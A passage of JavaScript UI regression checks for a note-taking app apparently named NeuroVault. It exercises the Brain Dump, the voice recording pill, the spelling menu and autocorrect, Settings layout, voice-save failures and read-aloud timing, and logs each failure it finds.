      for (const step of [1, 2, 3]) { S.modal = wrapDemo(step, {}); renderAll(); fileNames(`wrap-up ${step}`); oneWeight(`wrap-up ${step}`); }
      set({ modal: 'dump' }); fileNames('brain dump'); set({ modal: null }); S.toast = null; }

    // 7: a click away closes the Brain Dump and keeps the draft; a click inside, or a playing clip, keeps it open
    { set({ view: 'notes', modal: null }); openDump(); const inp = app.querySelector('#dump-input'); inp.value = 'half a thought'; inp.dispatchEvent(new Event('input', { bubbles: true }));
      app.querySelector('.dump .dump-list').click(); const inside = S.modal === 'dump';
      app.querySelector('.view').click(); const away = S.modal, shown = !!app.querySelector('.dump'), draft = S.dumpDraft;
      openDump(); const back = app.querySelector('#dump-input')?.value;
      S.clips.__c = { playing: true, pos: 0, speed: 1 }; app.querySelector('.view').click(); const playing = S.modal; delete S.clips.__c; closeModal();
      C.flows.dump = `inside ${inside} · away → ${away} (bar ${shown}) · draft "${draft}" · reopened "${back}" · playing → ${playing}`;
      if (!inside || away !== null || shown || draft !== 'half a thought' || back !== 'half a thought' || playing !== 'dump') iss('Fix C Brain Dump click-away (7)', C.flows.dump);
      S.dumpDraft = ''; }

    // 8: the mic shows only the pill: no dialog is drawn between the click and the pill
    { set({ view: 'notes', modal: null }); voiceClosed(); const seen = [], mo = new MutationObserver(ms => ms.forEach(m => m.addedNodes.forEach(nd => { if (nd.nodeType !== 1) return;
        [nd, ...nd.querySelectorAll('*')].forEach(e => { if (e.matches('.vpill')) seen.push('pill'); else if (e.matches('.modal, .modal-backdrop')) seen.push(e.className); }); })));
      await withApi({ voice_status: () => new Promise(r => setTimeout(() => r({ status: 'success', model: { present: true, name: 'base.en' }, download: null }), 40)), voice_start: () => new Promise(r => setTimeout(() => r({ status: 'success' }), 60)),
        voice_poll: () => ({ stage: 'recording', seconds: 0, bars: [] }) }, async () => {
        mo.observe(app, { childList: true, subtree: true }); app.querySelector('[data-act="voice"]').click();
        for (let i = 0; i < 50 && S.voice.stage !== 'recording'; i++) await new Promise(r => setTimeout(r, 20)); await new Promise(r => setTimeout(r, 30)); mo.disconnect();
        C.flows.voice = `${S.voice.stage}: ${[...new Set(seen)].join(', ') || 'nothing'} drawn`; voiceDiscard(); });
      if (seen[0] !== 'pill' || seen.some(x => x !== 'pill')) iss('Fix C a dialog flashes before the voice pill (8)', C.flows.voice); }

    // 17: Sync details: no sideways scroll, the tables stacked, long lines cut with the whole line on hover
    for (const sc of Object.keys(SCREENS)) { set({ screen: sc, sample: 'stress', view: 'notes', modal: 'sync' }); const mb = app.querySelector('.modal-body'), r = px(mb);
      const over = [...mb.querySelectorAll('.mini-row')].filter(x => px(x).r > r.r + .5).length, untitled = [...mb.querySelectorAll('.mini-row .truncate')].filter(x => !x.title).length, cols = new Set([...mb.querySelectorAll('.sync-tables > .card')].map(c => half(px(c).l))).size;
      if (mb.scrollWidth > mb.clientWidth + 1 || over || untitled || cols !== 1) iss('Fix C Sync details scrolls sideways (17)', `${sc}: scroll ${mb.scrollWidth}/${mb.clientWidth} · rows past ${over} · no tooltip ${untitled} · columns ${cols}`); }
    set({ screen: '1920x1080', sample: 'typical', modal: null });

    // 14: Offline fallback is greyed out with Coming soon, with the router on or off; the gguf picker goes straight to the bridge
    { AI.st = aiDemo('ready'); AIS.tab = 'jobs'; S.setSec = 'ai';
      for (const auto of [true, false]) { AI.st.auto_route = auto; set({ modal: 'settings' }); const row = app.querySelector('.route-row.is-soon');
        if (!row || !/Offline fallback/.test(row.textContent) || !row.querySelector('.soon-tag') || row.querySelector('select') || app.querySelector('[data-k="fallback"]')) iss('Fix C Offline fallback Coming soon (14)', `auto ${auto}`); }
      const realNv = window.nv, via = []; window.nv = (n, ...a) => { via.push(n); return realNv(n, ...a); };
      const c = await withApi({ ai_add_gguf: () => new Promise(r => setTimeout(() => r({ status: 'cancelled' }), 30)) }, async () => { fire('ai-gguf'); await new Promise(r => setTimeout(r, 60)); });
      window.nv = realNv; C.flows.gguf = `bridge ${c.join(',')} · through nv ${via.join(',') || 'nothing'}`;
      if (!c.includes('ai_add_gguf') || via.includes('ai_add_gguf')) iss('Fix C ai_add_gguf skips nv()\'s 8 s limit', C.flows.gguf);
      // the Settings pane keeps its place on a page, and another page starts at the top
      AI.st = aiDemo('ready', true); AIS.tab = 'jobs'; S.setSec = 'ai'; set({ screen: '1366x768', modal: 'settings' }); const pane = () => app.querySelector('.settings-pane'); pane().scrollTop = 200; const at = pane().scrollTop; renderAll(); const same = pane().scrollTop;
      S.setSec = 'appearance'; renderAll(); const other = pane().scrollTop; C.flows.scroll = `${at} → same page ${same} → another page ${other}`;
      if (!at || Math.abs(same - at) > 1 || other !== 0) iss('Fix C Settings scroll across pages', C.flows.scroll);
      AI.st = null; AI.demo = false; S.setSec = 'appearance'; set({ screen: '1920x1080', modal: null }); }
  }
  /* ==== end Fix C ==== */
  /* ---- Fix A (QC 3): Ctrl+A on a note that starts with its tasks list (21); the note's right-click menu closes on a press
     elsewhere, Esc, the wheel and the window losing focus, not on a redraw's scroll, and Look up runs with a redraw between
     press and release (2, 3); Shift at the press gives the browser's menu (3); Recent lookups keeps its order (4) ---- */
  { const A = out.numbers.fixA = {}, tick = () => new Promise(r => setTimeout(r, 0));
    set({ screen: '1920x1080', theme: 'obsidian', sample: 'typical', view: 'notes', modal: null }); S.noteId = 'note-1';
    const n = note(); n.md = '{{tasks}}\n\nOne line here.\n\nTwo lines here.'; n.html = null; renderAll();
    let doc = app.querySelector('.doc'); doc.focus(); edPut(edPoint(doc, Infinity));
    const key = (k, o = {}) => document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...o }));
    key('a', { ctrlKey: true }); const sel = getSelection().toString().trim(); key('Delete');
    const left = [...doc.children].map(c => c.matches('[data-md="tasks"]') ? 'tasks' : c.tagName + (c.textContent.trim() ? ':' + c.textContent.trim() : '')).join(' ');
    A.selectAll = `Ctrl+A selected "${sel.replace(/\s+/g, ' ')}" · Delete left ${left}`;
    if (!/^One line here\.\s+Two lines here\.$/.test(sel) || left !== 'tasks P') iss('Fix A Ctrl+A on a note that starts with its tasks', A.selectAll);
    // the menu's checks right-click a word, which must be on screen: the frame is made the pane's size for them
    frame.style.width = Math.max(1024, Math.min(1920, innerWidth)) + 'px'; frame.style.height = Math.max(640, Math.min(1080, innerHeight)) + 'px';
    clearTimeout(n.saveT); n.docDirty = false; n.dirty = false; n.md = 'Consolidate the plan. Look it up.'; n.html = null; renderAll(); doc = app.querySelector('.doc');
    const word = () => { const o = djWordOccurrences(app.querySelector('.doc'), 'Consolidate')[0], r = document.createRange(); r.setStart(o.node, o.start); r.setEnd(o.node, o.end); return r.getBoundingClientRect(); };
    const open = (o = {}) => { const b = word(), at = { bubbles: true, cancelable: true, clientX: b.left + 3, clientY: b.top + b.height / 2 }, t = document.elementFromPoint(at.clientX, at.clientY) || app.querySelector('.doc');
      t.dispatchEvent(new PointerEvent('pointerdown', { ...at, button: 2, buttons: 2, shiftKey: !!o.shiftDown })); const ev = new MouseEvent('contextmenu', { ...at, button: 2, shiftKey: !!o.shift }); t.dispatchEvent(ev);
      return ev.defaultPrevented; };
    const isOpen = () => !!S.ctx && !!app.querySelector('.menu--word'), closes = {};
    { const b = word(); if (b.left < 0 || b.right > innerWidth || b.bottom > innerHeight) iss('Fix A menu checks: the word is off screen', `${Math.round(b.left)},${Math.round(b.top)} in ${innerWidth}×${innerHeight}`); }
    open(); A.opens = isOpen(); djCtxClose(); if (!A.opens) iss('Fix A right-click menu did not open', '');
    open(); closes.press = isOpen(); app.querySelector('.app-header, .status-bar').dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, button: 0 })); closes.press = closes.press && !isOpen();
    open(); key('Escape'); closes.esc = !isOpen() && document.activeElement === app.querySelector('.doc');
    open(); dispatchEvent(new Event('blur')); closes.blur = !isOpen();
    open(); app.querySelector('.doc').dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 40 })); closes.wheel = !isOpen();
    open(); renderAll(); (app.querySelector('.view--note') || app.querySelector('.doc')).dispatchEvent(new Event('scroll')); closes.redrawKeepsIt = isOpen();
    A.closes = Object.entries(closes).map(([k, v]) => `${k} ${v}`).join(' · '); if (Object.values(closes).some(v => !v)) iss('Fix A right-click menu closing', A.closes);
    open(); const b0 = app.querySelector('.menu--word [data-act="ctx-lookup"]'); b0?.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, button: 0 })); renderAll();   // a redraw between press and release
    const b1 = app.querySelector('.menu--word [data-act="ctx-lookup"]'); b1?.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, cancelable: true, button: 0 })); document.body.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 1 }));   // the real click that follows the release
    for (let i = 0; i < 4; i++) await tick(); A.lookup = `the button was ${b0 === b1 ? 'kept' : 'redrawn'} · popover "${S.word?.word}" ${S.modal}`;
    if (S.modal !== 'word' || S.word?.word !== 'Consolidate') iss('Fix A Look up with a redraw mid-click', A.lookup);
    S.modal = null; S.word = null; renderAll();
    const nat = [open({ shift: true }) && !!S.ctx, (djCtxClose(), open({ shiftDown: true })) && !!S.ctx, (djCtxClose(), open()) && !!S.ctx]; djCtxClose();   // parity round (r49-hint): no Windows menu, Shift + right-click is a plain one
    A.shift = `Shift + right-click ours ${nat[0]} · Shift let go before the release ours ${nat[1]} · plain right-click ours ${nat[2]}`; if (nat.some(v => !v)) iss('Fix A Shift + right-click is a plain right-click', A.shift);
    djDemo('ready'); set({ view: 'dict', modal: null }); DJ.recent = ['consolidate', 'resolution', 'affect']; DJ.q = ''; DJ.res = null; renderAll();
    for (let i = 0; i < 4; i++) await tick(); renderAll();
    app.querySelector('.dict-row[data-recent][data-v="affect"]')?.click(); for (let i = 0; i < 4; i++) await tick();
    const r1 = DJ.recent.join(', '), shown = DJ.sel; const i = app.querySelector('#dict-q'); i.value = 'receive'; i.dispatchEvent(new Event('input', { bubbles: true }));
    i.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); for (let j = 0; j < 8; j++) await tick();
    A.recent = `opened ${shown} from Recent: ${r1} · then a search: ${DJ.recent.join(', ')}`;
    if (shown !== 'affect' || r1 !== 'consolidate, resolution, affect' || DJ.recent[0] !== 'receive') iss('Fix A Recent lookups order', A.recent);
    // 23: a long note scrolls past its end: the last block reaches about the middle of the pane (Document and Raw .md),
    // clear of the status bar, and typing at the end of Raw .md keeps the end on screen (it used to send the page to the top)
    A.scroll = {};
    for (const sc of ['1366x768', '1920x1080', '3440x1440']) for (const mode of ['wysiwyg', 'raw']) {
      set({ screen: sc, theme: 'obsidian', sample: 'typical', view: 'notes', modal: null }); S.noteId = 'note-1'; S.mode = mode;
      const n1 = note(); clearTimeout(n1.saveT); n1.docDirty = false; n1.md = Array.from({ length: 90 }, (_, i) => `Line ${i + 1} of a long note.`).join('\n\n'); n1.html = null; renderAll();
      const v = app.querySelector('.view--note'), k = `${sc}/${mode}`; if (!v) { iss('Fix A note view missing', k); continue; }
      v.scrollTop = v.scrollHeight; const vr = v.getBoundingClientRect(), sb = app.querySelector('.status-bar').getBoundingClientRect();
      const lastEl = mode === 'raw' ? app.querySelector('#raw-markdown-textarea') : [...app.querySelector('.doc').children].filter(c => c.offsetHeight).pop(), lr = lastEl.getBoundingClientRect();
      const pct = Math.round((lr.bottom - vr.top) / v.clientHeight * 100); let kept = '';
      if (mode === 'raw') { const ta = lastEl, top = v.scrollTop; ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); ta.value += '\n\nTyped at the end'; ta.setSelectionRange(ta.value.length, ta.value.length); ta.dispatchEvent(new Event('input', { bubbles: true }));
        const end = ta.getBoundingClientRect().bottom, vb = v.getBoundingClientRect(), endPct = Math.round((end - vb.top) / v.clientHeight * 100);
        kept = ` · typing at the end: scroll ${Math.round(top)} → ${Math.round(v.scrollTop)}, the end at ${endPct}%`; if (endPct < 0 || endPct > 100) iss('Fix A Raw .md: the end goes off screen when typing there', `${k}${kept}`); }
      A.scroll[k] = `last block at ${pct}% of a ${v.clientHeight}px pane${kept}`;
      if (pct > 60) iss('Fix A the end of a note can not scroll to about mid-pane', `${k}: ${pct}%`);   // 40% room: 49–56% at 1366–3440
      if (lr.bottom > sb.top + .5) iss('Fix A the last line is under the status bar', k);
    }
    S.mode = 'wysiwyg';
    // 26: spelling. The browser's red line (Windows' spell checker) is on in the editor in every theme and font, and
    // NeuroVault draws no second line on the words it marks itself (doubled before); off in Raw .md and with Spell check
    // off; a misspelled word's menu leads with "Did you mean", a pick replaces the word (Ctrl+Z puts it back), "Ignore in
    // this note" draws it inside spellcheck="false" and the .md keeps it
    A.spell = {};
    for (const [th] of THEMES) for (const [font] of FONTS) {
      set({ screen: '1366x768', theme: th, font, sample: 'typical', view: 'notes', modal: null }); S.noteId = 'note-1'; S.mode = 'split';
      const n2 = note(); clearTimeout(n2.saveT); n2.docDirty = false; n2.md = 'I recieve the notes.'; n2.html = null; renderAll();
      const d2 = app.querySelector('.doc'), ta = app.querySelector('#raw-markdown-textarea'), mark = d2?.querySelector('.spell'), k = `${th}/${font}`;
      const own = mark ? getComputedStyle(mark).textDecorationLine : 'no mark';
      if (!d2?.spellcheck || ta?.spellcheck !== false || own !== 'none') iss('Fix A spelling line', `${k}: editor ${d2?.spellcheck}, raw ${ta?.spellcheck}, NeuroVault's own line ${own}`);
      if (font === 'opendyslexic') A.spell[th] = `red line on, Raw .md off, no second line (${own})`;
    }
    S.mode = 'wysiwyg'; S.a11y.spell = false; renderAll(); if (app.querySelector('.doc')?.spellcheck) iss('Fix A Spell check off still checks', ''); S.a11y.spell = true;
    set({ theme: 'obsidian', font: 'opendyslexic' }); djDemo('ready');
    frame.style.width = Math.max(1024, Math.min(1920, innerWidth)) + 'px'; frame.style.height = Math.max(640, Math.min(1080, innerHeight)) + 'px';
    const n3 = note(); clearTimeout(n3.saveT); n3.docDirty = false; n3.md = 'Our milstone is near. Consolidate it.'; n3.html = null; renderAll();
    const at = w => { const o = djWordOccurrences(app.querySelector('.doc'), w)[0]; if (!o) return null; const r = document.createRange(); r.setStart(o.node, o.start); r.setEnd(o.node, o.end); return r.getBoundingClientRect(); };
    const rclick = w => { const b = at(w); if (!b) return false; const p = { bubbles: true, cancelable: true, clientX: b.left + 3, clientY: b.top + b.height / 2 }, t = document.elementFromPoint(p.clientX, p.clientY) || app.querySelector('.doc');
      t.dispatchEvent(new PointerEvent('pointerdown', { ...p, button: 2 })); t.dispatchEvent(new MouseEvent('contextmenu', { ...p, button: 2 })); return true; };
    rclick('milstone'); for (let i = 0; i < 6; i++) await tick();
    const m1 = app.querySelector('.menu--word'), first = m1?.querySelector('[data-act="ctx-fix"]');
    A.spellMenu = m1 ? [...m1.querySelectorAll('.menu-label, .menu-item, .menu-hint')].map(x => x.textContent.trim()).join(' | ') : 'no menu';
    if (!m1 || m1.firstElementChild !== first || first?.dataset.v !== 'milestone' || !m1.querySelector('[data-act="ctx-ignore"]') || /Windows/.test(m1.innerHTML)) iss('Fix A spelling menu', A.spellMenu);   // Build M parity: no Windows menu, so no hint   // Build M round 6: R49 tight (no label; the hint is Check spelling's tooltip)
    first?.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, cancelable: true, button: 0 })); for (let i = 0; i < 3; i++) await tick();
    const fixed = app.querySelector('.doc').textContent; app.querySelector('.doc').focus(); key('z', { ctrlKey: true }); const undone = app.querySelector('.doc').textContent;
    A.spellFix = `pick → "${fixed.trim()}" · Ctrl+Z → "${undone.trim()}"`; if (!/Our milestone is near/.test(fixed) || !/Our milstone is near/.test(undone)) iss('Fix A spelling pick and undo', A.spellFix);
    rclick('Consolidate'); for (let i = 0; i < 6; i++) await tick();
    if (/Did you mean/.test(app.querySelector('.menu--word')?.textContent || 'x')) iss('Fix A a known word gets Did you mean', ''); djCtxClose();
    rclick('milstone'); for (let i = 0; i < 6; i++) await tick();
    app.querySelector('.menu--word [data-act="ctx-ignore"]')?.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, cancelable: true, button: 0 })); for (let i = 0; i < 3; i++) await tick();
    const ok = app.querySelector('.doc .spell-ok'), md3 = NVMarkdown.htmlToMd(typedLinks(app.querySelector('.doc'), n3.html));
    A.spellIgnore = `ignored ${JSON.stringify(DJS.ignore)} · drawn ${ok ? `spellcheck=${ok.getAttribute('spellcheck')}` : 'plain'} · .md "${md3.trim()}"`;
    if (!ok || ok.spellcheck || !/^Our milstone is near/.test(md3) || /span/.test(md3)) iss('Fix A Ignore in this note', A.spellIgnore);
    rclick('milstone'); for (let i = 0; i < 6; i++) await tick(); if (/Did you mean/.test(app.querySelector('.menu--word')?.textContent || '')) iss('Fix A an ignored word gets Did you mean', ''); djCtxClose();
    DJS.ignore = {};
    // QC 4 · 29: the note's ⋮ More has Check spelling, F7 on the right (as Zen mode's F11)
    S.menu = true; renderAll(); const sp = app.querySelector('.app-header .menu [data-act="spell-pass"]'), zk = app.querySelector('.app-header .menu [data-act="zen"] .menu-kbd'); S.menu = false; renderAll();
    A.moreSpell = sp ? `${sp.textContent.trim()} · ${sp.disabled ? 'off' : 'on'}` : 'missing';
    if (!sp || sp.disabled || sp.querySelector('.menu-kbd')?.textContent !== 'F7' || zk?.textContent !== 'F11') iss('Fix A ⋮ More has no Check spelling (F7)', A.moreSpell);
    // QC 4 · 30: "Spelling and autocorrect work in: Everywhere you write | Only in notes". The red line (spellcheck) on each
    // field; in the Brain Dump, the right-click suggestions (a pick, Ctrl+Z), F7 and autocorrect, with each setting
    A.where = {}; const was = SPW.where, sc = s => { const e = app.querySelector(s); return e ? e.spellcheck : null; };
    const want = { everywhere: { '#dump-input': true, '#new-task-title': true, '.doc': true, '#note-title-input': true, '#search-input': false, '#raw-markdown-textarea': false, '#note-tags-input': false },
      notes: { '#dump-input': false, '#new-task-title': false, '.doc': true, '#note-title-input': true, '#search-input': false, '#raw-markdown-textarea': false, '#note-tags-input': false } };
    const field = async (where, md) => { SPW.where = where; set({ view: 'notes', modal: 'dump' }); S.mode = 'split'; renderAll(); S.dumpDraft = ''; const el = app.querySelector('#dump-input'); el.focus(); el.value = md; el.setSelectionRange(md.length, md.length); el.dispatchEvent(new Event('input', { bubbles: true })); const e2 = app.querySelector('#dump-input'); e2.focus(); e2.setSelectionRange(md.length, md.length); return e2; };
    for (const where of ['everywhere', 'notes']) {
      SPW.where = where; const got = {};
      set({ view: 'notes', modal: 'dump' }); S.mode = 'split'; renderAll(); for (const s of ['#dump-input', '.doc', '#note-title-input', '#search-input', '#raw-markdown-textarea', '#note-tags-input']) got[s] = sc(s);
      S.mode = 'wysiwyg'; set({ view: 'tasks', modal: null }); got['#new-task-title'] = sc('#new-task-title');
      const bad = Object.entries(want[where]).filter(([s, v]) => got[s] !== null && got[s] !== v).map(([s, v]) => `${s} ${got[s]} (want ${v})`);
      A.where[where] = { line: bad.join(', ') || 'right' };
      // right-click "recieve" in the Brain Dump
      let el = await field(where, 'I recieve it'); const b = el.getBoundingClientRect(); djCtxClose();
      const ev = new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: b.left + 30, clientY: b.top + b.height / 2, button: 2 });
      S.ctx = null; el.setSelectionRange(3, 3); const at = document.caretPositionFromPoint; document.caretPositionFromPoint = () => ({ offsetNode: el, offset: 4 });
      el.dispatchEvent(ev); document.caretPositionFromPoint = at; for (let i = 0; i < 6; i++) await tick();
      const m = app.querySelector('.menu--word'), fix = m?.querySelector('[data-act="ctx-fix"]');
      A.where[where].menu = m ? [...m.querySelectorAll('.menu-label, .menu-item')].map(x => x.textContent.trim()).join(' | ') : 'none (the browser\'s own)';
      if (where === 'everywhere') {
        fix?.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, cancelable: true, button: 0 })); for (let i = 0; i < 3; i++) await tick();
        el = app.querySelector('#dump-input'); const picked = el?.value; key('z', { ctrlKey: true }); const undone = app.querySelector('#dump-input')?.value;
        A.where[where].pick = `"${picked}" · Ctrl+Z "${undone}" · ${S.modal === 'dump' ? 'dump open' : 'dump closed'}`;
        if (!m || fix?.dataset.v !== 'receive' || /Ignore in this note/.test(m.textContent) || m.querySelector('[data-act="ctx-lookup"]') || picked !== 'I receive it' || undone !== 'I recieve it' || S.modal !== 'dump') iss('Fix A spelling in the Brain Dump (right-click)', A.where[where].menu + ' → ' + A.where[where].pick);
      } else if (m) iss('Fix A Only in notes: the Brain Dump still gets the spelling menu', A.where[where].menu);   // the text box's own Cut/Copy/Paste menu is fine (no Windows menu)
      djCtxClose();
      // F7 in the Brain Dump
      el = await field(where, 'I recieve it'); key('F7'); for (let i = 0; i < 6; i++) await tick();
      const card = app.querySelector('.spellpass'); A.where[where].f7 = card ? card.textContent.replace(/\s+/g, ' ').trim().slice(0, 90) : `no card · ${S.status || ''}`;
      if (where === 'everywhere') {
        app.querySelector('.spellpass [data-act="spell-replace"]')?.click(); for (let i = 0; i < 6; i++) await tick();
        A.where[where].f7 += ` → "${app.querySelector('#dump-input')?.value}"`;
        if (!card || !SP.field || app.querySelector('#dump-input')?.value !== 'I receive it' || !app.querySelector('.spellpass--field') || S.modal !== 'dump') iss('Fix A Check spelling (F7) in the Brain Dump', A.where[where].f7);
      } else if (card || !/notes only/.test(S.status || '')) iss('Fix A Only in notes: F7 in the Brain Dump checks it', A.where[where].f7);
      if (SP.on) spClose();
      // autocorrect: a space after "recieve"
      el = await field(where, 'I recieve'); el.dispatchEvent(new InputEvent('beforeinput', { inputType: 'insertText', data: ' ', bubbles: true, cancelable: true }));
      el.setRangeText(' ', el.value.length, el.value.length, 'end'); for (let i = 0; i < 8; i++) await tick();
      const ac = app.querySelector('#dump-input')?.value; A.where[where].autocorrect = `"I recieve" + space → "${ac}"`;
      if (ac !== (where === 'everywhere' ? 'I receive ' : 'I recieve ')) iss(`Fix A autocorrect in the Brain Dump (${where})`, A.where[where].autocorrect);
      if (A.where[where].line !== 'right') iss(`Fix A spelling line per field (${where})`, A.where[where].line);
    }
    SPW.where = was; ACOR.last = null; FUNDO.last = null; S.dumpDraft = ''; set({ view: 'notes', modal: null }); S.mode = 'wysiwyg';
    // QC 4 · 35: a voice note's ![[…]] line goes in only once its file is saved and listed; a failed save adds nothing, keeps
    // the recording and says "Couldn't save the recording" with Try again. A made-up backend: no mic, no sound
    { const was2 = { vault: VAULT.live, cap: CAPTURE.live, atts: D.atts, py: window.pywebview }, f = 'attachments/voice-20261017-221517' + clipExt(), calls = [];
      let answers = {};
      window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...a) => { calls.push([nm, a]); return Promise.resolve(answers[nm] ? answers[nm](...a) : { status: 'success' }); } }) };
      VAULT.live = true; CAPTURE.live = true;
      const steps = [];
      try {
        Object.assign(S.voice, { stage: 'ask', keep: 'both', dest: 'dump', text: 'clean', result: JSON.parse(JSON.stringify(VOICE_DEMO)), txErr: '', take: { seconds: 2, file: f }, added: new Set(), skip: new Set(), saving: false, pending: false, saveErr: '' });
        S.modal = 'voice'; renderAll();
        const tryIt = async (keep, listed, label) => { answers = { voice_keep: keep, list_attachments: () => ({ status: 'success', files: listed, folder: '' }), add_inbox_voice: () => ({ status: 'error', message: 'stop here' }) };
          calls.length = 0; await acceptV2(); for (let i = 0; i < 4; i++) await tick();
          const btn = app.querySelector('#voice-save'), added = calls.find(c => c[0] === 'add_inbox_voice');
          steps.push(`${label}: ${added ? `added with ${added[1][1]}` : 'nothing added'} · ${S.voice.saveErr || 'no error'} · button "${btn?.textContent.trim() || 'gone'}"`);
          return { added, btn, alert: app.querySelector('.modal[data-dlg="voice"] .alert--danger') }; };
        const a = await tryIt(() => ({ status: 'error', message: "Couldn't save the recording: There is not enough space on the disk." }), [], 'the save fails');
        const b = await tryIt(() => ({ status: 'success', file: f, size: 9000, seconds: 2, recycled: false }), [], 'saved but not listed');
        const c = await tryIt(() => ({ status: 'success', file: f, size: 9000, seconds: 2, recycled: false }), [{ file: f, name: attBase(f), kind: 'audio', size: 9000, mtime: '2026-10-17T22:17:00', seconds: 2 }], 'saved and listed');
        A.voiceSave = steps.join(' → ');
        if (a.added || !a.alert || !/Couldn't save the recording: There is not enough space/.test(S.voice.saveErr || steps[0]) || !/Try again/.test(a.btn?.textContent || '')) iss('Fix A a failed voice save (35)', steps[0]);
        if (b.added || !/isn't in the attachments folder/.test(steps[1])) iss('Fix A a voice save that isn\'t on disk (35)', steps[1]);
        if (!c.added || c.added[1][1] !== f) iss('Fix A a saved voice clip (35)', steps[2]);
        // QC 4 · 35 (Rename…, Find the file…): a missing clip says so in plain words, with Find the file…; the ⋮ has Rename…; names are checked
        const n5 = note(), md5 = n5.md, have = D.atts.find(x => attKind(x.file) === 'audio')?.file;
        n5.md = `![[attachments/voice-gone.ogg]]\n\n![[${have}]]\n`; n5.html = null; S.modal = null; renderAll();
        const gone = app.querySelector('.doc .clip.is-missing'), ok5 = app.querySelector(`.doc .clip:not(.is-missing) [data-act="att-menu"]`);
        S.attMenu = have; renderAll(); const menu5 = app.querySelector('.clip-menu')?.textContent || ''; S.attMenu = null;
        const errs = ['', 'a/b', 'CON', '.x', 'x'.repeat(130)].map(t => attNameErr(have, t)), ext5 = attNameErr(have, 'New name' + attExt(have));
        A.rename = `missing: "${gone?.textContent.replace(/\s+/g, ' ').trim()}" · menu "${menu5}" · refused ${errs.filter(Boolean).length}/5 · "New name${attExt(have)}" ${ext5 || 'fine'}`;
        if (!gone || !/Recording not found/.test(gone.textContent) || /File not found|attachments\//.test(gone.textContent) || !gone.querySelector('[data-act="att-find"]') || !ok5 || !/Rename…/.test(menu5) || errs.some(x => !x) || ext5) iss('Fix A Rename… and Find the file… (35)', A.rename);
        n5.md = md5; n5.html = null;
      } finally { window.pywebview = was2.py; VAULT.live = was2.vault; CAPTURE.live = was2.cap; D.atts = was2.atts; Object.assign(S.voice, { stage: 'idle', saving: false, pending: false, saveErr: '', take: null, result: null }); S.modal = null; S.toast = null; renderAll(); } }
    // QC 4 · 41: Settings → Editor → "Spelling and autocorrect", one flat group (it was a boxed card pasted in, and the
    // settings were in three places): its rows in order, after the editor's own and before Split screen; Reset only when
    // something differs; and no card inside any Settings pane's flat list
    { const want = ['Spell check', 'Spelling and autocorrect work in', 'Autocorrect as you type', 'How sure it must be', 'Learn from my notes', 'What it learned', 'Words never to correct'], was3 = { ...ACOR.cfg }, w3 = SPW.where;
      const pane = () => { S.setSec = 'editor'; set({ modal: 'settings' }); return app.querySelector('.settings-pane'); };
      let p = pane(); const g = p.querySelector('.pop-sec.sp-set'), labels = g ? [...g.querySelectorAll('.set-label')].map(x => x.textContent.trim()) : [];
      const tops = [...(g?.parentElement.children || [])], at = tops.indexOf(g), split = tops.findIndex(x => x.matches('.pn-set')), last = tops.slice(0, at).filter(x => x.matches('.set-row')).pop()?.querySelector('.set-label')?.textContent;
      const elsewhere = [...p.querySelectorAll('.set-label')].filter(x => !g?.contains(x) && /^(Spell check|Spelling and autocorrect work in|Autocorrect as you type)$/.test(x.textContent.trim())).length;
      const reset0 = !!g?.querySelector('[data-act="ac-reset"]'); ACOR.cfg.strength = 'more'; p = pane(); const reset1 = !!p.querySelector('.sp-set [data-act="ac-reset"]'); Object.assign(ACOR.cfg, was3); SPW.where = w3;
      A.spellGroup = `${g ? `"${g.querySelector('.eyebrow')?.textContent}": ${labels.join(' · ')}` : 'missing'} · after "${last}" · ${split > at ? 'before Split screen' : 'not before Split screen'} · Reset ${reset0 ? 'shown' : 'hidden'} at the defaults, ${reset1 ? 'shown' : 'hidden'} once changed · ${elsewhere} outside it`;
      if (!g || labels.join('|') !== want.join('|') || !(split > at) || last !== 'Pasted images' || reset0 || !reset1 || elsewhere || g.querySelector('.card') || p.querySelector('.cf-card--ac')) iss('Fix A Spelling and autocorrect group (41)', A.spellGroup);
      const nested = [], known = [], KNOWN = ['ain-place-card'];   // Build N's "Where answers show" (AI models) is the same pasted card: reported to the coordinator for Build N
      for (const [sec] of SET_SECTIONS) { if (SET_SOON[sec]) continue; S.setSec = sec; set({ modal: 'settings' }); app.querySelectorAll('.settings-pane .card .card, .settings-pane .pop-sec .card').forEach(c => (KNOWN.some(k => c.classList.contains(k)) ? known : nested).push(`${sec}: ${c.className}`)); }
      A.nestedCards = `${nested.length} in a flat list${known.length ? ` · known, Build N's: ${known.join(', ')}` : ''}`;
      if (nested.length) iss('Fix A a card inside a Settings pane\'s flat list (41)', nested.slice(0, 4).join(' | '));
      S.modal = null; renderAll(); }
    // QC 4 · 47: while the read-aloud player is open, the status bar's read time is the player's listening time: from its
    // timeline, halved at 2×, matching elapsed + left, refreshed when Kokoro's real lengths arrive; "N min read" once closed.
    // Muted: the check opens the bar but never speaks (CHECK_READ), and the lengths are made up
    { const keep = { speed: READ.speed, engine: READ.engine, sherpa: READ.sherpa, pieces: READ.pieces, durs: READ.durs, noteId: READ.noteId }, rd = () => app.querySelector('#read-time-display')?.textContent || 'none';
      set({ view: 'notes', modal: null }); const n7 = note(), md7 = n7.md; n7.md = 'One sentence to read here. Another sentence follows it.\n\nA new paragraph with a few more words in it.'; n7.html = null; renderAll();
      const shut = rd(); READ.speed = 1; openRead(); const t1 = readTimeline(), s1 = rd();
      app.querySelector('.readbar [data-act="read-speed"][data-v="2"]')?.click(); await tick(); const t2 = readTimeline(), s2 = rd();
      READ.engine = 'sherpa'; READ.sherpa = { available: true, voices: [] }; READ.speed = 1; READ.pieces = readPieces(); READ.durs = READ.pieces.map(() => 3); paintReadProgress(); const t3 = readTimeline(), s3 = rd();
      app.querySelector('.readbar [data-act="read-speed"][data-v="2"]')?.click(); await tick(); await tick(); const t4 = readTimeline(), s4 = rd();
      closeModal(); renderAll(); const s5 = rd();
